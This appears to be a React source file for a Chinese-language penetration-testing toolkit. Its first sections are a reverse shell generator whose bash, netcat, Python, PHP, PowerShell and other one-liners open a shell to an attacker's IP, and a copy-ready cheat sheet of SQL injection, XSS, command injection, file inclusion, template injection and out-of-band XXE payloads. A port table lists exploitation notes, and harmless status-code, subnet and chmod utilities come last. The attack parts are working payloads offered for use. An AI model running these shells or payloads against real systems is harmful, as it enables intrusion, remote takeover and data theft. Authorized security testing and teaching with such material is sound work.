import React, { useState, useMemo } from 'react'
import { Panel, Btn, TA, Input, Select, ErrorNote, KV, CopyBtn, Stat } from '../components/ui'

/* ================= 反弹 Shell 生成器 ================= */

type ShellTpl = { name: string; lang: string; tpl: (ip: string, port: string) => string }

const SHELL_TEMPLATES: ShellTpl[] = [
  { name: 'Bash TCP', lang: 'bash', tpl: (i, p) => `bash -i >& /dev/tcp/${i}/${p} 0>&1` },
  { name: 'Bash UDP', lang: 'bash', tpl: (i, p) => `sh -i >& /dev/udp/${i}/${p} 0>&1` },
  { name: 'Netcat (mkfifo)', lang: 'bash', tpl: (i, p) => `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ${i} ${p} >/tmp/f` },
  { name: 'Netcat -e', lang: 'bash', tpl: (i, p) => `nc -e /bin/sh ${i} ${p}` },
  { name: 'Python3', lang: 'python', tpl: (i, p) => `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${i}",${p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'` },
  { name: 'PHP', lang: 'php', tpl: (i, p) => `php -r '$sock=fsockopen("${i}",${p});exec("sh <&3 >&3 2>&3");'` },
  { name: 'Perl', lang: 'perl', tpl: (i, p) => `perl -e 'use Socket;$i="${i}";$p=${p};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'` },
  { name: 'Ruby', lang: 'ruby', tpl: (i, p) => `ruby -rsocket -e 'exit if fork;c=TCPSocket.new("${i}",${p});while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'` },
  { name: 'PowerShell', lang: 'powershell', tpl: (i, p) => `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${i}',${p});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"` },
  { name: 'Java', lang: 'java', tpl: (i, p) => `r = Runtime.getRuntime()\np = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/${i}/${p};cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[])\np.waitFor()` },
  { name: 'socat', lang: 'bash', tpl: (i, p) => `socat TCP:${i}:${p} EXEC:sh` },
  { name: 'awk', lang: 'bash', tpl: (i, p) => `awk 'BEGIN {s = "/inet/tcp/0/${i}/${p}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null` },
]

export function ReverseShellTool() {
  const [ip, setIp] = useState('10.10.10.10')
  const [port, setPort] = useState('4444')
  const [selected, setSelected] = useState('Bash TCP')

  const tpl = SHELL_TEMPLATES.find(t => t.name === selected)!
  const cmd = tpl.tpl(ip, port)
  const listener = `nc -lvnp ${port}`

  return (
    <div className="space-y-3">
      <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
        <Input value={ip} onChange={setIp} label="攻击机 IP (LHOST)" />
        <Input value={port} onChange={setPort} label="端口 (LPORT)" />
        <Select value={selected} onChange={setSelected} label="Payload 类型" options={SHELL_TEMPLATES.map(t => ({ value: t.name, label: t.name }))} />
      </div>
      <Panel title={`目标机执行 · ${tpl.name}`} right={<CopyBtn text={cmd} />}>
        <pre className="codeblock text-[12.5px] text-phosphor">{cmd}</pre>
      </Panel>
      <Panel title="攻击机监听（先启动）" right={<CopyBtn text={listener} />}>
        <pre className="codeblock text-[12.5px] text-amber">{listener}</pre>
      </Panel>
      <Panel title="TTY 升级备忘">
        <ul className="text-[12px] text-muted space-y-1">
          <li><span className="text-phosphor">python3 -c 'import pty;pty.spawn("/bin/bash")'</span> — 获得交互式 TTY</li>
          <li><span className="text-phosphor">Ctrl+Z → stty raw -echo; fg</span> — 完整终端（支持 Ctrl+C / 补全）</li>
          <li><span className="text-phosphor">export TERM=xterm</span> — 修复 clear / top 等命令</li>
        </ul>
      </Panel>
    </div>
  )
}

/* ================= Payload 速查 ================= */

type PayloadGroup = { name: string; items: { label: string; payload: string; note?: string }[] }

const PAYLOADS: PayloadGroup[] = [
  {
    name: 'SQL 注入 (SQLi)',
    items: [
      { label: '万能登录绕过', payload: `' OR '1'='1' -- -`, note: '经典认证绕过' },
      { label: '注释截断', payload: `admin'--`, note: '截断后续 SQL' },
      { label: '联合查询探测', payload: `' UNION SELECT NULL,NULL,NULL-- -`, note: '列数需与源表一致' },
      { label: '报错注入 (MySQL)', payload: `' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -`, note: '通过报错回显数据' },
      { label: '时间盲注', payload: `' AND IF(1=1,SLEEP(5),0)-- -`, note: '通过响应延迟判断' },
      { label: '布尔盲注', payload: `' AND SUBSTRING((SELECT database()),1,1)='a'-- -`, note: '逐字符猜解' },
      { label: '堆叠查询', payload: `'; DROP TABLE users-- -`, note: '部分驱动支持多语句' },
      { label: '读文件', payload: `' UNION SELECT NULL,LOAD_FILE('/etc/passwd')-- -`, note: '需要 FILE 权限' },
    ],
  },
  {
    name: 'XSS 跨站脚本',
    items: [
      { label: '基础弹窗', payload: `<script>alert(document.domain)</script>` },
      { label: 'img 事件', payload: `<img src=x onerror=alert(1)>`, note: '绕过 script 过滤' },
      { label: 'svg 事件', payload: `<svg onload=alert(1)>` },
      { label: '事件属性', payload: `" onfocus=alert(1) autofocus="`, note: '闭合属性注入' },
      { label: '伪协议', payload: `<a href="javascript:alert(1)">click</a>` },
      { label: '大小写混淆', payload: `<ScRiPt>alert(1)</sCrIpT>`, note: '绕过黑名单' },
      { label: '编码绕过', payload: `<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>`, note: 'HTML 实体编码' },
      { label: 'DOM 型', payload: `#<img src=x onerror=alert(1)>`, note: '通过 location.hash 触发' },
    ],
  },
  {
    name: '命令注入',
    items: [
      { label: '分号拼接', payload: `; id`, note: '顺序执行' },
      { label: '与逻辑', payload: `&& whoami` },
      { label: '管道', payload: `| cat /etc/passwd` },
      { label: '反引号', payload: '`id`', note: '命令替换' },
      { label: '$() 替换', payload: `$(cat /etc/passwd)` },
      { label: '绕过空格过滤', payload: `cat\${IFS}/etc/passwd`, note: '${IFS} 代替空格' },
      { label: '通配符绕过', payload: `/bin/c?t /etc/pass?d` },
    ],
  },
  {
    name: '文件包含 / 路径穿越',
    items: [
      { label: 'LFI 基础', payload: `../../../../etc/passwd`, note: '逐级回溯' },
      { label: 'URL 编码', payload: `..%2f..%2f..%2fetc%2fpasswd` },
      { label: '双重编码', payload: `..%252f..%252f..%252fetc%252fpasswd`, note: '绕过一层解码' },
      { label: 'php://filter', payload: `php://filter/convert.base64-encode/resource=index.php`, note: 'Base64 读取源码' },
      { label: 'php://input', payload: `php://input`, note: 'POST body 作为代码执行' },
      { label: 'data://', payload: `data://text/plain,<?php phpinfo();?>`, note: '需 allow_url_include' },
      { label: '空字节截断', payload: `../../../../etc/passwd%00`, note: 'PHP < 5.3.4' },
    ],
  },
  {
    name: 'SSTI 模板注入',
    items: [
      { label: '探测', payload: `{{7*7}}`, note: '返回 49 则存在注入' },
      { label: 'Jinja2 探测', payload: `{{7*'7'}}`, note: 'Jinja2 返回 7777777，Twig 返回 49' },
      { label: 'Jinja2 RCE', payload: `{{''.__class__.__mro__[1].__subclasses__()}}`, note: '枚举可用类' },
      { label: 'Twig 信息', payload: `{{_self.env}}` },
    ],
  },
  {
    name: 'XXE 实体注入',
    items: [
      { label: '基础读文件', payload: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`, note: '配合 &xxe; 引用' },
      { label: '参数实体', payload: `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker/evil.dtd"> %xxe;]>`, note: 'OOB 外带数据' },
    ],
  },
]

export function PayloadCheatSheetTool() {
  const [filter, setFilter] = useState('')
  const filtered = useMemo(() => {
    if (!filter.trim()) return PAYLOADS
    const q = filter.toLowerCase()
    return PAYLOADS.map(g => ({
      ...g,
      items: g.items.filter(i => i.label.toLowerCase().includes(q) || i.payload.toLowerCase().includes(q)),
    })).filter(g => g.items.length > 0)
  }, [filter])

  return (
    <div className="space-y-3">
      <Input value={filter} onChange={setFilter} label="筛选" placeholder="输入关键词过滤 payload..." />
      {filtered.map(g => (
        <Panel key={g.name} title={g.name}>
          <div className="space-y-1.5">
            {g.items.map((it, i) => (
              <div key={i} className="flex flex-col sm:flex-row sm:items-start justify-between gap-2 sm:gap-3 border border-line-soft bg-panel-2 px-3 py-2">
                <div className="min-w-0">
                  <div className="text-[11px] text-muted">{it.label}{it.note ? ` · ${it.note}` : ''}</div>
                  <code className="text-[12.5px] text-phosphor break-all">{it.payload}</code>
                </div>
                <CopyBtn text={it.payload} className="shrink-0 mt-0.5 self-start" />
              </div>
            ))}
          </div>
        </Panel>
      ))}
      {filtered.length === 0 && <ErrorNote msg="没有匹配的 payload" />}
    </div>
  )
}

/* ================= 端口速查 ================= */

const PORTS: { port: number; service: string; note: string; risky?: boolean }[] = [
  { port: 21, service: 'FTP', note: '文件传输，明文认证，常见匿名登录漏洞', risky: true },
  { port: 22, service: 'SSH', note: '安全远程登录，常遭暴力破解' },
  { port: 23, service: 'Telnet', note: '明文远程登录，应禁用', risky: true },
  { port: 25, service: 'SMTP', note: '邮件发送，可探测用户（VRFY/EXPN）' },
  { port: 53, service: 'DNS', note: '域名解析，区域传送(AXFR)泄露风险', risky: true },
  { port: 80, service: 'HTTP', note: 'Web 服务主战场' },
  { port: 110, service: 'POP3', note: '邮件接收' },
  { port: 135, service: 'RPC/DCOM', note: 'Windows RPC，永恒之蓝相关信息收集点' },
  { port: 139, service: 'NetBIOS', note: 'SMB 共享相关' },
  { port: 143, service: 'IMAP', note: '邮件访问' },
  { port: 389, service: 'LDAP', note: '目录服务，AD 渗透关键' },
  { port: 443, service: 'HTTPS', note: '加密 Web' },
  { port: 445, service: 'SMB', note: '文件共享，MS17-010 永恒之蓝', risky: true },
  { port: 873, service: 'rsync', note: '未授权访问可读写文件', risky: true },
  { port: 1080, service: 'SOCKS', note: '代理端口，常见内网穿透' },
  { port: 1433, service: 'MSSQL', note: 'SQL Server，xp_cmdshell 提权', risky: true },
  { port: 1521, service: 'Oracle', note: 'Oracle 数据库' },
  { port: 2049, service: 'NFS', note: '网络文件系统，配置错误可挂载', risky: true },
  { port: 2181, service: 'Zookeeper', note: '未授权访问可读取集群信息', risky: true },
  { port: 2375, service: 'Docker API', note: '未授权即可创建特权容器逃逸', risky: true },
  { port: 3000, service: 'Grafana/Dev', note: '常见开发服务端口' },
  { port: 3306, service: 'MySQL', note: '弱口令 + UDF 提权', risky: true },
  { port: 3389, service: 'RDP', note: '远程桌面，爆破/BlueKeep', risky: true },
  { port: 5432, service: 'PostgreSQL', note: 'COPY ... PROGRAM 可 RCE' },
  { port: 5900, service: 'VNC', note: '远程桌面，弱口令高发' },
  { port: 6379, service: 'Redis', note: '未授权访问 → 写 SSH key / 计划任务', risky: true },
  { port: 8080, service: 'HTTP-Alt', note: 'Tomcat / 代理 / 各种后台' },
  { port: 8443, service: 'HTTPS-Alt', note: '管理后台常见' },
  { port: 9200, service: 'Elasticsearch', note: '未授权访问泄露数据', risky: true },
  { port: 11211, service: 'Memcached', note: '未授权可读写缓存', risky: true },
  { port: 27017, service: 'MongoDB', note: '未授权访问 / 注入', risky: true },
]

export function PortRefTool() {
  const [q, setQ] = useState('')
  const filtered = PORTS.filter(p =>
    !q || String(p.port).includes(q) || p.service.toLowerCase().includes(q.toLowerCase()) || p.note.toLowerCase().includes(q.toLowerCase()))
  return (
    <div className="space-y-3">
      <Input value={q} onChange={setQ} label="搜索" placeholder="端口 / 服务名 / 关键词..." />
      <div className="border border-line-soft overflow-auto max-h-[520px]">
        <table className="w-full text-[12px]">
          <thead className="sticky top-0 bg-panel-2">
            <tr className="text-muted text-left">
              <th className="px-3 py-2 font-normal w-20">端口</th>
              <th className="px-3 py-2 font-normal w-36">服务</th>
              <th className="px-3 py-2 font-normal">渗透测试要点</th>
            </tr>
          </thead>
          <tbody>
            {filtered.map(p => (
              <tr key={p.port + p.service} className="border-t border-line-soft hover:bg-phosphor-faint">
                <td className="px-3 py-1.5 text-phosphor">{p.port}</td>
                <td className="px-3 py-1.5">{p.service}</td>
                <td className={`px-3 py-1.5 ${p.risky ? 'text-amber' : 'text-muted'}`}>{p.risky ? '⚠ ' : ''}{p.note}</td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>
    </div>
  )
}

/* ================= HTTP 状态码 ================= */

const HTTP_CODES: [number, string, string][] = [
  [100, 'Continue', '客户端应继续发送请求体'],
  [101, 'Switching Protocols', '协议切换，常见于 WebSocket 升级'],
  [200, 'OK', '请求成功'],
  [201, 'Created', '资源已创建'],
  [202, 'Accepted', '已接收，异步处理中'],
  [204, 'No Content', '成功但无返回体'],
  [206, 'Partial Content', '断点续传 / Range 请求'],
  [301, 'Moved Permanently', '永久重定向'],
  [302, 'Found', '临时重定向'],
  [304, 'Not Modified', '缓存有效'],
  [307, 'Temporary Redirect', '临时重定向，保持方法'],
  [308, 'Permanent Redirect', '永久重定向，保持方法'],
  [400, 'Bad Request', '请求语法错误'],
  [401, 'Unauthorized', '需要认证（响应带 WWW-Authenticate）'],
  [403, 'Forbidden', '已认证但无权限'],
  [404, 'Not Found', '资源不存在'],
  [405, 'Method Not Allowed', '方法不允许'],
  [408, 'Request Timeout', '请求超时'],
  [409, 'Conflict', '资源冲突'],
  [410, 'Gone', '资源已永久删除'],
  [413, 'Payload Too Large', '请求体过大'],
  [414, 'URI Too Long', 'URI 过长'],
  [415, 'Unsupported Media Type', 'Content-Type 不支持'],
  [418, "I'm a teapot", '彩蛋：我是茶壶，拒绝煮咖啡 (RFC 2324)'],
  [422, 'Unprocessable Entity', '语义错误，参数校验失败'],
  [429, 'Too Many Requests', '触发限流'],
  [431, 'Request Header Fields Too Large', '请求头过大'],
  [451, 'Unavailable For Legal Reasons', '因法律原因不可用'],
  [500, 'Internal Server Error', '服务器内部错误'],
  [501, 'Not Implemented', '未实现'],
  [502, 'Bad Gateway', '网关错误，上游无响应'],
  [503, 'Service Unavailable', '服务不可用 / 维护中'],
  [504, 'Gateway Timeout', '网关超时'],
  [505, 'HTTP Version Not Supported', 'HTTP 版本不支持'],
]

export function HttpStatusTool() {
  const [q, setQ] = useState('')
  const filtered = HTTP_CODES.filter(([c, n, d]) =>
    !q || String(c).includes(q) || n.toLowerCase().includes(q.toLowerCase()) || d.includes(q))
  const groups: [string, (c: number) => boolean][] = [
    ['1xx 信息', c => c < 200], ['2xx 成功', c => c >= 200 && c < 300],
    ['3xx 重定向', c => c >= 300 && c < 400], ['4xx 客户端错误', c => c >= 400 && c < 500],
    ['5xx 服务器错误', c => c >= 500],
  ]
  return (
    <div className="space-y-3">
      <Input value={q} onChange={setQ} label="搜索" placeholder="404 / redirect / 限流..." />
      {groups.map(([gname, pred]) => {
        const items = filtered.filter(([c]) => pred(c))
        if (!items.length) return null
        return (
          <Panel key={gname} title={gname}>
            <div className="space-y-1">
              {items.map(([c, n, d]) => (
                <div key={c} className="flex flex-wrap gap-x-4 items-baseline px-1 py-1.5 border-b border-line-soft last:border-0">
                  <span className={`w-10 shrink-0 ${c >= 500 ? 'text-danger' : c >= 400 ? 'text-amber' : c >= 300 ? 'text-[#7ec8ff]' : 'text-phosphor'}`}>{c}</span>
                  <span className="sm:w-56 shrink-0 text-[12.5px]">{n}</span>
                  <span className="text-muted text-[12px] basis-full sm:basis-auto sm:flex-1 pl-14 sm:pl-0">{d}</span>
                </div>
              ))}
            </div>
          </Panel>
        )
      })}
    </div>
  )
}

/* ================= 子网计算 ================= */

function ipToInt(ip: string): number | null {
  const parts = ip.trim().split('.')
  if (parts.length !== 4) return null
  let n = 0
  for (const p of parts) {
    const v = parseInt(p)
    if (isNaN(v) || v < 0 || v > 255 || String(v) !== p.trim()) return null
    n = (n << 8) | v
  }
  return n >>> 0
}
function intToIp(n: number): string {
  return [(n >>> 24) & 255, (n >>> 16) & 255, (n >>> 8) & 255, n & 255].join('.')
}

export function SubnetTool() {
  const [input, setInput] = useState('192.168.1.10/24')

  const r = useMemo(() => {
    const m = input.trim().match(/^([\d.]+)\s*\/\s*(\d{1,2})$/)
    if (!m) return null
    const ip = ipToInt(m[1])
    const cidr = parseInt(m[2])
    if (ip === null || cidr < 0 || cidr > 32) return { error: '格式：192.168.1.10/24' }
    const mask = cidr === 0 ? 0 : (0xFFFFFFFF << (32 - cidr)) >>> 0
    const network = (ip & mask) >>> 0
    const broadcast = (network | (~mask >>> 0)) >>> 0
    const hostCount = cidr >= 31 ? (cidr === 31 ? 2 : 1) : Math.max(broadcast - network - 1, 0)
    return {
      ip: intToIp(ip), cidr, mask: intToIp(mask),
      wildcard: intToIp(~mask >>> 0),
      network: intToIp(network),
      broadcast: intToIp(broadcast),
      firstHost: cidr >= 31 ? intToIp(network) : intToIp(network + 1),
      lastHost: cidr >= 31 ? intToIp(broadcast) : intToIp(broadcast - 1),
      hosts: hostCount,
      ipClass: (ip >>> 24) < 128 ? 'A' : (ip >>> 24) < 192 ? 'B' : (ip >>> 24) < 224 ? 'C' : ((ip >>> 24) < 240 ? 'D (组播)' : 'E'),
      isPrivate: (ip >>> 24) === 10 || ((ip >>> 20) & 0xFFF) === 0xAC1 || (ip >>> 16) === 0xC0A8,
      binMask: intToIp(mask).split('.').map(o => parseInt(o).toString(2).padStart(8, '0')).join('.'),
    }
  }, [input])

  return (
    <div className="space-y-3">
      <Input value={input} onChange={setInput} label="CIDR 表示法" placeholder="10.0.0.0/8" />
      {r && 'error' in r && <ErrorNote msg={r.error!} />}
      {r && !('error' in r) && (
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-3">
          <Panel title="网络信息">
            <KV k="IP 地址" v={r.ip} />
            <KV k="网络地址" v={<span className="text-phosphor">{r.network}/{r.cidr}</span>} />
            <KV k="广播地址" v={r.broadcast} />
            <KV k="子网掩码" v={r.mask} />
            <KV k="通配符掩码" v={r.wildcard} />
            <KV k="掩码(二进制)" v={<span className="text-[10px] sm:text-[11px]">{r.binMask}</span>} />
          </Panel>
          <Panel title="主机范围">
            <KV k="第一个可用" v={<span className="text-phosphor">{r.firstHost}</span>} />
            <KV k="最后可用" v={<span className="text-phosphor">{r.lastHost}</span>} />
            <KV k="可用主机数" v={<span className="text-amber">{r.hosts.toLocaleString()}</span>} />
            <KV k="地址类别" v={r.ipClass + ' 类'} />
            <KV k="私有地址" v={r.isPrivate ? '是 (RFC 1918)' : '否'} />
          </Panel>
        </div>
      )}
    </div>
  )
}

/* ================= chmod ================= */

export function ChmodTool() {
  const [perm, setPerm] = useState({ ur: true, uw: true, ux: true, gr: true, gw: false, gx: true, or: true, ow: false, ox: true })
  const [octalInput, setOctalInput] = useState('')

  const calc = (p: typeof perm) => {
    const digit = (r: boolean, w: boolean, x: boolean) => (r ? 4 : 0) + (w ? 2 : 0) + (x ? 1 : 0)
    const oct = `${digit(p.ur, p.uw, p.ux)}${digit(p.gr, p.gw, p.gx)}${digit(p.or, p.ow, p.ox)}`
    const sym = ['u', 'g', 'o'].map((who, i) => {
      const r = i === 0 ? p.ur : i === 1 ? p.gr : p.or
      const w = i === 0 ? p.uw : i === 1 ? p.gw : p.ow
      const x = i === 0 ? p.ux : i === 1 ? p.gx : p.ox
      return `${r ? 'r' : '-'}${w ? 'w' : '-'}${x ? 'x' : '-'}`
    }).join('')
    return { oct, sym }
  }

  const { oct, sym } = calc(perm)

  const applyOctal = (v: string) => {
    setOctalInput(v)
    if (/^[0-7]{3}$/.test(v)) {
      const d = v.split('').map(Number)
      setPerm({
        ur: !!(d[0] & 4), uw: !!(d[0] & 2), ux: !!(d[0] & 1),
        gr: !!(d[1] & 4), gw: !!(d[1] & 2), gx: !!(d[1] & 1),
        or: !!(d[2] & 4), ow: !!(d[2] & 2), ox: !!(d[2] & 1),
      })
    }
  }

  const toggle = (k: keyof typeof perm) => {
    const np = { ...perm, [k]: !perm[k] }
    setPerm(np)
    setOctalInput(calc(np).oct)
  }

  const rows: [string, [keyof typeof perm, keyof typeof perm, keyof typeof perm]][] = [
    ['所有者 (u)', ['ur', 'uw', 'ux']],
    ['所属组 (g)', ['gr', 'gw', 'gx']],
    ['其他人 (o)', ['or', 'ow', 'ox']],
  ]

  return (
    <div className="space-y-4">
      <div className="space-y-2">
        {rows.map(([label, keys]) => (
          <div key={label} className="flex items-center gap-4">
            <span className="w-28 text-muted text-[12px]">{label}</span>
            {(['r 读', 'w 写', 'x 执行'] as const).map((name, i) => (
              <label key={name} className="flex items-center gap-1.5 cursor-pointer text-[12px]">
                <input type="checkbox" checked={perm[keys[i]]} onChange={() => toggle(keys[i])} className="accent-phosphor" />
                <span className={perm[keys[i]] ? 'text-phosphor' : 'text-muted'}>{name}</span>
              </label>
            ))}
          </div>
        ))}
      </div>
      <div className="grid grid-cols-1 md:grid-cols-3 gap-2">
        <div className="border border-line-soft bg-panel-2 px-3 py-2">
          <div className="text-[10px] uppercase tracking-widest text-muted">八进制</div>
          <div className="flex items-center gap-2">
            <span className="text-xl text-phosphor glow">{oct}</span>
            <CopyBtn text={`chmod ${oct} file`} />
          </div>
        </div>
        <div className="border border-line-soft bg-panel-2 px-3 py-2">
          <div className="text-[10px] uppercase tracking-widest text-muted">符号表示</div>
          <div className="flex items-center gap-2">
            <span className="text-xl text-phosphor glow">{sym}</span>
            <CopyBtn text={sym} />
          </div>
        </div>
        <div className="border border-line-soft bg-panel-2 px-3 py-2">
          <div className="text-[10px] uppercase tracking-widest text-muted">反查</div>
          <input value={octalInput} onChange={e => applyOctal(e.target.value)} placeholder="755"
            className="bg-transparent text-xl text-amber w-24 focus:outline-none" />
        </div>
      </div>
    </div>
  )
}
